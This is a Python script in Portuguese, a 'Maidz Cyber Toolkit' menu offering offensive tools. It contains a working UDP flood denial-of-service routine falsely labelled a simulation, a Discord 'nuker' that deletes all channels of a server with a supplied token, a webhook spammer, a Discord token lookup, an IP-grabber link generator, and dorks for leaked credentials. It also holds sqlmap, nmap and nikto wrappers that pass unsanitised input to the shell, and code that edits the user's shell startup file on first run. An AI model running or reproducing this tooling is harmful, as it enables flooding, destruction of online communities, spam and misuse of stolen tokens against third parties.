#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MAIDZ CYBER TOOLKIT v2.0 - VERSÃO SIMPLIFICADA E FUNCIONAL
"""

import os
import sys
import time
import socket
import random
import json
import requests
from datetime import datetime

# =============================================================
# TENTA IMPORTAR COLORAMA, SE NÃO TIVER, USA CORES SIMPLES
# =============================================================
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # Fallback sem colorama
    class Fore:
        LIGHTWHITE_EX = ''
        LIGHTMAGENTA_EX = ''
        GREEN = ''
        RED = ''
        YELLOW = ''
        CYAN = ''
        BLUE = ''
    class Style:
        RESET_ALL = ''
    def init(): pass

# =============================================================
# CONFIGURAÇÕES
# =============================================================
USER_NAME = "cruz"
HOST_NAME = "localhost"

# =============================================================
# ARTE ASCII (somente texto, sem f-strings problemáticas)
# =============================================================
CYBERFETCH_ART = """
                       +                      
                     +++                     
                    +++++                    
                   +++++++                   
                   ++++++=+                  
                  ++++++++=                 
                 ++++++++++=                
                + ++++++++++=                
               +++++++++++++==               
              ======+++++++++==              
             ============+++++==             
            ========+++++++++++==            
           =====++++++++++++++++++           
          ==+++++++++++++++++++++++          
         ++++++++++++   ++++++++++++         
        *++++++++++       +++++++++++        
       +++++++++++         +++++++++++       
      ++++++++++++         *+++++++++++      
     ++++++++++++*         *+++++++++*++     
    *+++++++++++++         +++++++++++++     
   +++++++++++*               *+++++++++++   
  ++++++++                         *+++++++  
 *++++                                 +++++ 
++*                                       +*+
"""

def cyberfetch():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(CYBERFETCH_ART)
    print("════════════════════════════════════════════════════")
    print("  MAIDZ CYBER TEAM  ")
    print("  ✦ Pentest | OSINT | Dorking | Exploits ✦")
    print("════════════════════════════════════════════════════")
    print(f"  Usuário : {USER_NAME}")
    print(f"  Host    : {HOST_NAME}")
    print(f"  Data    : {datetime.now().strftime('%d/%m/%Y %H:%M')}")
    print(f"  Shell   : {os.environ.get('SHELL', '/bin/bash')}")
    print("════════════════════════════════════════════════════")
    print("  Ferramentas carregadas: 12")
    print("  Grupo: Maidz Cyber Team")
    print("════════════════════════════════════════════════════")

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# =============================================================
# FERRAMENTAS (VERSÃO SIMPLIFICADA)
# =============================================================

def dorking_menu():
    clear()
    print("[MAIDZ] DORKING TOOLS")
    print("1. Google Dorks (exemplo)")
    print("2. GitHub Dorks (busca por credenciais)")
    print("3. PDF/Arquivos sensíveis")
    print("4. SQL Injection dorks")
    print("5. Voltar")
    opt = input("Escolha: ")
    if opt == "1":
        print("[*] Exemplo: site:example.com intitle:index of")
        print("[*] Lista: https://github.com/1d8/Google-Dorks")
    elif opt == "2":
        print("[*] GitHub Dorks: extension:env DB_PASSWORD")
    elif opt == "3":
        print("[*] PDF Dork: filetype:pdf confidential")
    elif opt == "4":
        print("[*] SQL Dork: inurl:id= site:example.com")
    else:
        return
    input("Pressione Enter para voltar...")

def ip_grabber():
    clear()
    print("[MAIDZ] IP GRABBER (gerador de link)")
    print("[!] Gera um link que captura o IP de quem clicar (via serviço externo).")
    url = input("URL de destino (ex: seu site): ") or "https://www.example.com"
    fake_link = f"https://ipgrabber.xyz/redirect?url={url}"
    print(f"[+] Link gerado: {fake_link}")
    print("[*] Ao acessar, o IP será registrado (simulação).")
    input("Pressione Enter para voltar...")

def ip_pinger():
    clear()
    print("[MAIDZ] IP PINGER")
    target = input("IP ou domínio: ")
    if not target:
        print("[!] Alvo não informado.")
        input("Enter...")
        return
    print(f"[*] Pingando {target}...")
    os.system(f"ping -c 4 {target}")
    input("Enter...")

def discord_account_shower():
    clear()
    print("[MAIDZ] DISCORD ACCOUNT SHOWER")
    token = input("Token Discord (ou ID): ")
    if not token:
        print("[!] Token necessário.")
        input("Enter...")
        return
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print("[+] Conta encontrada:")
            print(f"  Username: {data.get('username')}#{data.get('discriminator')}")
            print(f"  ID: {data.get('id')}")
            print(f"  Email: {data.get('email', 'Não disponível')}")
            print(f"  Verificado: {data.get('verified')}")
            print(f"  MFA: {data.get('mfa_enabled')}")
        else:
            print(f"[!] Erro: {r.status_code}")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

def osint_searcher():
    clear()
    print("[MAIDZ] OSINT SEARCHER")
    query = input("Termo a pesquisar (nome, email, etc.): ")
    if not query:
        return
    print(f"[*] Buscando informações sobre {query}...")
    print("[!] Usando serviços públicos (simulação).")
    print(f"Google: https://www.google.com/search?q={query}")
    print(f"LinkedIn: https://www.linkedin.com/search/results/all/?keywords={query}")
    print(f"GitHub: https://github.com/search?q={query}")
    input("Enter...")

def leaks_searcher():
    clear()
    print("[MAIDZ] LEAKS SEARCHER")
    email = input("Email para verificar vazamentos: ")
    if not email:
        return
    print(f"[*] Verificando se {email} está em vazamentos...")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            print(f"[+] Este email apareceu em {len(breaches)} vazamentos:")
            for b in breaches:
                print(f"  - {b.get('Name')} (Data: {b.get('BreachDate')})")
        elif r.status_code == 404:
            print("[+] Nenhum vazamento conhecido.")
        else:
            print(f"[!] Erro na API: {r.status_code}")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

def discord_spammer():
    clear()
    print("[MAIDZ] DISCORD SPAMMER (webhook)")
    webhook = input("Webhook URL: ")
    if not webhook:
        return
    msg = input("Mensagem a spammar: ") or "SPAM!"
    count = int(input("Quantidade de mensagens: ") or "5")
    delay = float(input("Delay entre mensagens (segundos): ") or "0.5")
    print("[!] ATENÇÃO: Isso pode resultar em banimento do webhook.")
    confirm = input("Continuar? (s/n): ")
    if confirm.lower() != 's':
        return
    for i in range(count):
        try:
            payload = {"content": msg}
            r = requests.post(webhook, json=payload, timeout=5)
            if r.status_code == 204:
                print(f"[+] Mensagem {i+1} enviada.")
            else:
                print(f"[!] Erro: {r.status_code}")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Erro: {e}")
    input("Enter...")

def discord_nuker():
    clear()
    print("[MAIDZ] DISCORD NUKER (webhook)")
    print("[!] Isso irá deletar canais, roles, etc. (apenas com permissões adequadas)")
    token = input("Token do bot (ou usuário): ")
    guild_id = input("ID do servidor: ")
    if not token or not guild_id:
        return
    confirm = input("Realmente deseja nukear o servidor? (s/n): ")
    if confirm.lower() != 's':
        return
    headers = {"Authorization": token}
    try:
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if r.status_code == 200:
            channels = r.json()
            for ch in channels:
                print(f"[*] Deletando canal: {ch.get('name')} ({ch.get('id')})")
                del_r = requests.delete(f"https://discord.com/api/v9/channels/{ch.get('id')}", headers=headers)
                if del_r.status_code in (200, 204):
                    print("[+] Canal deletado.")
                else:
                    print(f"[!] Erro ao deletar canal: {del_r.status_code}")
                time.sleep(0.5)
        else:
            print(f"[!] Erro ao listar canais: {r.status_code}")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

def discord_username_checker():
    clear()
    print("[MAIDZ] DISCORD USERNAME CHECKER")
    username = input("Nome a verificar: ")
    if not username:
        return
    url = "https://discord.com/api/v10/unique-username/username-attempt-unauthed"
    payload = {"username": username}
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("taken") == False:
                print(f"[+] {username} está DISPONÍVEL!")
            else:
                print(f"[-] {username} já está em uso.")
        else:
            print(f"[!] Erro: {r.status_code}")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

def dorking_tools():
    clear()
    print("[MAIDZ] DORKING TOOLS - EXTRA")
    print("1. SQLMap (injeção SQL)")
    print("2. Nmap (escaneamento)")
    print("3. Nikto (scanner web)")
    opt = input("Escolha: ")
    if opt == "1":
        url = input("URL alvo: ")
        if url:
            os.system(f"sqlmap -u {url} --batch")
    elif opt == "2":
        target = input("Alvo: ")
        if target:
            os.system(f"nmap -sV {target}")
    elif opt == "3":
        target = input("URL alvo: ")
        if target:
            os.system(f"nikto -h {target}")
    else:
        print("[!] Opção inválida.")
    input("Enter...")

def tiktok_name_searcher():
    clear()
    print("[MAIDZ] TIKTOK NAME SEARCHER")
    username = input("Nome de usuário TikTok: ")
    if not username:
        return
    url = f"https://www.tiktok.com/@{username}"
    print(f"[*] Verificando perfil: {url}")
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            print("[+] Perfil encontrado!")
        elif r.status_code == 404:
            print("[-] Perfil não encontrado (disponível).")
        else:
            print(f"[!] Status: {r.status_code}")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

def dos_attack():
    clear()
    print("[MAIDZ] DOS ATTACK (simulação)")
    target = input("IP/domínio alvo: ")
    port = int(input("Porta (ex: 80): ") or "80")
    duration = int(input("Duração (segundos): ") or "5")
    print("[!] ATENÇÃO: Isso é uma simulação educacional.")
    confirm = input("Continuar? (s/n): ")
    if confirm.lower() != 's':
        return
    try:
        target_ip = socket.gethostbyname(target)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1490)
        end_time = time.time() + duration
        packets = 0
        print(f"[*] Enviando pacotes UDP para {target_ip}:{port}...")
        while time.time() < end_time:
            sock.sendto(bytes_data, (target_ip, port))
            packets += 1
            if packets % 500 == 0:
                sys.stdout.write(f"\r[+] Pacotes: {packets}")
                sys.stdout.flush()
        print(f"\n[+] Concluído. {packets} pacotes enviados.")
    except Exception as e:
        print(f"[!] Erro: {e}")
    input("Enter...")

# =============================================================
# MENU PRINCIPAL
# =============================================================
def main_menu():
    clear()
    cyberfetch()
    print("\n════════════════════════════════════════════════════")
    print("  [MAIDZ CYBER TOOLKIT] - Menu Principal")
    print("════════════════════════════════════════════════════")
    print("  1.  Dorking (vários tipos)")
    print("  2.  IP Grabber (gerar link)")
    print("  3.  IP Pinger (ping)")
    print("  4.  Discord Account Shower")
    print("  5.  OSINT Searcher")
    print("  6.  Leaks Searcher")
    print("  7.  Discord Spammer (webhook)")
    print("  8.  Discord Nuker (webhook)")
    print("  9.  Discord Username Checker")
    print("  10. Dorking Tools (SQLMap, Nmap, Nikto)")
    print("  11. TikTok Name Searcher")
    print("  12. DOS Attack (simulação)")
    print("  13. Sair")
    print("════════════════════════════════════════════════════")
    return input("Escolha uma opção: ").strip()

# =============================================================
# CONFIGURAÇÃO DO SHELL (opcional)
# =============================================================
def setup_shell():
    shell_rc = os.path.expanduser("~/.bashrc")
    if os.path.exists(os.path.expanduser("~/.zshrc")):
        shell_rc = os.path.expanduser("~/.zshrc")
    lines_to_add = []
    lines_to_add.append('alias cyberfetch="python3 ' + os.path.abspath(sys.argv[0]) + ' --cyberfetch"')
    prompt_cmd = 'PS1="\\[\\033[37m\\]╭──(\\[\\033[35m\\]' + USER_NAME + '@' + HOST_NAME + '\\[\\033[37m\\])-(~)\\n\\[\\033[37m\\]╰──❯❯ \\[\\033[0m\\]"'
    lines_to_add.append(prompt_cmd)
    with open(shell_rc, 'r') as f:
        content = f.read()
    already = all(line in content for line in lines_to_add)
    if not already:
        with open(shell_rc, 'a') as f:
            f.write("\n# MAIDZ CYBER TOOLKIT CONFIG\n")
            for line in lines_to_add:
                f.write(line + "\n")
        print(f"[+] Configurações adicionadas ao {shell_rc}")
        print(f"[*] Recarregue com: source {shell_rc}")
    else:
        print("[*] Configurações já presentes.")

# =============================================================
# MAIN
# =============================================================
def main():
    # Primeiro print para confirmar execução
    print(">>> MAIDZ CYBER TOOLKIT INICIADO <<<")
    sys.stdout.flush()

    # Verifica argumentos
    if len(sys.argv) > 1 and sys.argv[1] == "--cyberfetch":
        clear()
        cyberfetch()
        sys.exit(0)

    # Primeira execução: configurar shell
    if not os.path.exists(os.path.expanduser("~/.maidz_setup_done")):
        print("[!] Primeira execução. Configurando shell...")
        setup_shell()
        with open(os.path.expanduser("~/.maidz_setup_done"), 'w') as f:
            f.write("done")
        print("[+] Configuração concluída. Execute 'source ~/.bashrc' (ou ~/.zshrc) para ativar.")
        input("Pressione Enter para continuar...")

    # Loop principal
    while True:
        opcao = main_menu()
        if opcao == "1":
            dorking_menu()
        elif opcao == "2":
            ip_grabber()
        elif opcao == "3":
            ip_pinger()
        elif opcao == "4":
            discord_account_shower()
        elif opcao == "5":
            osint_searcher()
        elif opcao == "6":
            leaks_searcher()
        elif opcao == "7":
            discord_spammer()
        elif opcao == "8":
            discord_nuker()
        elif opcao == "9":
            discord_username_checker()
        elif opcao == "10":
            dorking_tools()
        elif opcao == "11":
            tiktok_name_searcher()
        elif opcao == "12":
            dos_attack()
        elif opcao == "13":
            print("Saindo do MAIDZ CYBER TOOLKIT...")
            sys.exit(0)
        else:
            print("Opção inválida!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        # Garante que requests está instalado
        try:
            import requests
        except ImportError:
            print("Instalando requests...")
            os.system("pip install requests")
        # Executa o main
        main()
    except KeyboardInterrupt:
        print("\nSaindo...")
        sys.exit(0)